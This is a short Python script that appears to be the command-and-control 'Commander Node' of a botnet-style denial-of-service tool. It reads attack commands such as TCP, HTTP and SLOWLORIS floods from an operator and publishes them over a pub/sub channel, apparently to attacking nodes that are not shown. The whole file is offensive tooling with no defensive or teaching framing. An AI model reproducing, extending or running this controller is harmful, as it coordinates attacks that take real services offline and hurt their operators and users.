from infra.pubsub import PubSubClient

if __name__ == "__main__":
    print("================ Commander Node Started ================")
    pub = PubSubClient()

    try:
        while True:
            cmd = input("[COMMANDER] Enter attack command (e.g., TCP, HTTP, SLOWLORIS): ").strip()
            if not cmd:
                continue
            pub.publish(cmd)
            print(f"[COMMANDER] Command published: {cmd}")
    except KeyboardInterrupt:
        print("\n[COMMANDER] Shutting down gracefully.")
